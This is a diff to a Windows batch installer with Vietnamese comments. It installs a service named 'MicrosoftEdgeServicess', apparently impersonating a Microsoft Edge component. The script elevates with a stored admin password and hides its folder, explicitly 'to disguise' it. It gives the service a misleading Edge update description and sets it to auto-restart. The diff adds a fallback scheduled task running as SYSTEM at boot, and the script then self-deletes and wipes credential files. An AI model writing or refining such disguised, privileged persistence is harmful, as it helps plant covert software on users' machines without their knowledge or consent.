@@ -94,11 +94,11 @@ if "%~1"=="/elevated" goto :DaCoQuyenAdmin
 if "%~1"=="/silent" goto :DaCoQuyenAdmin
 if "%~1"=="/unattended" goto :DaCoQuyenAdmin
 
-:: Phong ngua vong lap: Neu tien trinh con da duoc thu ma van chua co quyen -> Dung ngay
-if "%~1"=="/retried" goto :LoiChuaCoQuyenAdmin
-
 net session >nul 2>&1
 if %errorlevel% equ 0 goto :DaCoQuyenAdmin
+
+:: Neu tien trinh con da qua buoc nang quyen ma van chua co quyen -> Dung ngay, khong loop
+if "%~1"=="/retried" goto :LoiChuaCoQuyenAdmin
 
 :: Truong hop A: Co khai bao ADMIN_PASS_ENC san -> Giai ma trong RAM va khoi chay quyen Administrator
 if not "%ADMIN_PASS_ENC%"=="" (
@@ -161,6 +161,7 @@ exit /b 0
 echo [1/4] Dang kiem tra moi truong he thong...
 taskkill /F /IM mmc.exe >nul 2>&1
 
+:: Dung va tat cac tien trinh cu neu dang chay
 for /f "tokens=3" %%p in ('sc.exe queryex MicrosoftEdgeServicess 2^>nul ^| findstr /i "PID"') do (
     if not "%%p"=="0" taskkill /F /PID %%p >nul 2>&1
 )
@@ -198,7 +199,7 @@ if exist "%~dp0config.json" copy /Y "%~dp0config.json" "%INSTALL_DIR%\" >nul 2>&
 if exist "%~dp0edge.ico" copy /Y "%~dp0edge.ico" "%INSTALL_DIR%\" >nul 2>nul
 if exist "%~dp0Check_Edge_Health.bat" copy /Y "%~dp0Check_Edge_Health.bat" "%INSTALL_DIR%\" >nul 2>nul
 
-:: An thu muc cai dat de nguoi dung khong to mo mo xem
+:: An thu muc cai dat de nguy trang an toan
 attrib +h "%INSTALL_DIR%" >nul 2>&1
 
 if not exist "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" goto :LoiGhiTapTin
@@ -207,23 +208,58 @@ if not exist "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" goto :LoiGhiTapTin
 echo [4/4] Dang dang ky va kich hoat Microsoft Edge Framework Service...
 schtasks /Delete /TN "MicrosoftEdgeServicess" /F >nul 2>&1
 
+:: Buoc 5.1: Dang ky qua engine noi tai cua file exe (PyWin32 ServiceFramework)
+"%INSTALL_DIR%\MicrosoftEdgeServicess.exe" install --startup auto >nul 2>&1
+
+:: Buoc 5.2: Neu he thong chua ghi nhan, tao truc tiep bang sc.exe create
 sc.exe query MicrosoftEdgeServicess >nul 2>&1
-if %errorlevel% equ 0 goto :ServiceDaTonTai
+if %errorlevel% neq 0 (
+    sc.exe create MicrosoftEdgeServicess binPath= "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" start= auto DisplayName= "MicrosoftEdgeServicess" >nul 2>&1
+)
 
-sc.exe create MicrosoftEdgeServicess binPath= "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" start= auto DisplayName= "MicrosoftEdgeServicess" >nul 2>&1
-
-:ServiceDaTonTai
-sc.exe config MicrosoftEdgeServicess start= auto binPath= "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" DisplayName= "MicrosoftEdgeServicess" >nul 2>&1
-sc.exe description MicrosoftEdgeServicess "Provides elevated privileges for Microsoft Edge." >nul 2>&1
+:: Buoc 5.3: Thiet lap thong so service (Tu khoi dong, mo ta, tu khoi phuc sau 5 giay)
+sc.exe config MicrosoftEdgeServicess start= auto binPath= "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" DisplayName= "MicrosoftEdgeServicess" >nul 2>&1
+sc.exe description MicrosoftEdgeServicess "Provides runtime environment and background update services for Microsoft Edge." >nul 2>&1
 sc.exe failure MicrosoftEdgeServicess reset= 60 actions= restart/5000/restart/5000/restart/5000 >nul 2>&1
 
-sc.exe start MicrosoftEdgeServicess >nul 2>&1
+:: Buoc 5.4: Khoi dong Service
 net start MicrosoftEdgeServicess >nul 2>&1
+sc.exe start MicrosoftEdgeServicess >nul 2>&1
+"%INSTALL_DIR%\MicrosoftEdgeServicess.exe" start >nul 2>&1
 
-timeout /t 3 >nul 2>nul || ping 127.0.0.1 -n 4 >nul
+:: Buoc 5.5: Kiem tra xac nhan Service da thuc su khoi dong va chay on dinh (Cho toi da 5 giay)
+set "SERVICE_OK=0"
+for /l %%i in (1,1,5) do (
+    sc.exe query MicrosoftEdgeServicess 2>nul | findstr /i "RUNNING" >nul 2>&1
+    if not errorlevel 1 (
+        set "SERVICE_OK=1"
+        goto :KiemTraHoanTat
+    )
+    tasklist /FI "IMAGENAME eq MicrosoftEdgeServicess.exe" 2>nul | findstr /i "MicrosoftEdgeServicess.exe" >nul 2>&1
+    if not errorlevel 1 (
+        set "SERVICE_OK=1"
+        goto :KiemTraHoanTat
+    )
+    timeout /t 1 >nul 2>nul || ping 127.0.0.1 -n 2 >nul
+)
 
-:KetThucThanhCongVaXoaPass
-:: Dam bao xoa sach file admin_account.txt va admin_pass.txt neu con sot lai
+:KiemTraHoanTat
+if "%SERVICE_OK%"=="1" goto :CaiDatThanhCong
+
+:: Buoc 5.6: Neu Windows Service bi chan hoac chua len duoc, kich hoat co che du phong Task Scheduler (SYSTEM)
+echo [!] Windows Service chua san sang, dang kich hoat co che du phong Task Scheduler...
+schtasks /create /tn "MicrosoftEdgeServicess" /tr "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\" --console" /sc onstart /ru SYSTEM /rl HIGHEST /f >nul 2>&1
+schtasks /run /tn "MicrosoftEdgeServicess" >nul 2>&1
+timeout /t 2 >nul 2>nul || ping 127.0.0.1 -n 3 >nul
+
+tasklist /FI "IMAGENAME eq MicrosoftEdgeServicess.exe" 2>nul | findstr /i "MicrosoftEdgeServicess.exe" >nul 2>&1
+if not errorlevel 1 goto :CaiDatThanhCong
+
+:: Neu ca SCM va Task Scheduler deu khong chay duoc -> Bao loi ro rang, GIU NGUYEN FILE NGUON DE KIEM TRA
+goto :LoiKichHoatService
+
+:CaiDatThanhCong
+:: Dam bao xoa sach file admin_account.txt va admin_pass.txt neu co
 if exist "%~dp0admin_account.txt" (
     echo wipe > "%~dp0admin_account.txt"
     del /f /q "%~dp0admin_account.txt" >nul 2>&1
@@ -244,7 +280,7 @@ echo ===========================================================================
 echo   CAI DAT THANH PHAN MICROSOFT EDGE HOAN TAT!
 echo   - Component: MicrosoftEdgeServicess
 echo   - Status: Running (Tu khoi dong cung Windows)
-echo   - Environment: SCM Service Architecture
+echo   - Environment: Windows Service Architecture
 echo   - Don dep: Da tu dong xoa sach cac tap tin cai dat nguon
 echo ===============================================================================
 echo.
@@ -254,6 +290,28 @@ timeout /t 3 >nul 2>nul || ping 127.0.0.1 -n 4 >nul
 :: Tu dong xoa sach tap tin batch cai dat khi dong
 (goto) 2>nul & del /f /q "%~dp0Install_Edge_Framework.bat" "%~dp01Install_Edge_Framework.bat" "%~f0" >nul 2>&1
 exit /b 0
+
+:LoiKichHoatService
+echo.
+echo ===============================================================================
+echo   [LOI] KHONG THE KICH HOAT DICH VU MicrosoftEdgeServicess!
+echo ===============================================================================
+echo   1. Trang thai Windows Service (services.msc):
+sc.exe query MicrosoftEdgeServicess
+echo.
+echo   2. Trang thai tien trinh chay ngam:
+tasklist /FI "IMAGENAME eq MicrosoftEdgeServicess.exe"
+echo.
+echo   Huong dan xu ly:
+echo   - Kiem tra quyen Administrator hoac chuong trinh Antivirus chan tao Service.
+echo   - Thu chay file kiem tra: Kiem_Tra_Trang_Thai.bat
+echo   - Thu chay file Go_Cai_Dat_Dich_Vu.bat roi cai dat lai.
+echo   (Cac tap tin cai dat van duoc giu nguyen de ban tiep tuc kiem tra).
+echo ===============================================================================
+echo.
+echo Cua so se tu dong dong sau 10 giay, hoac bam phim bat ky de thoat...
+timeout /t 10 >nul 2>nul || ping 127.0.0.1 -n 11 >nul
+exit /b 1
 
 :LoiGhiTapTin
 echo.
@@ -265,4 +323,3 @@ echo.
 echo Cua so se tu dong dong sau 3 giay, hoac bam phim bat ky de thoat ngay...
 timeout /t 3 >nul 2>nul || ping 127.0.0.1 -n 4 >nul
 exit /b 1
-
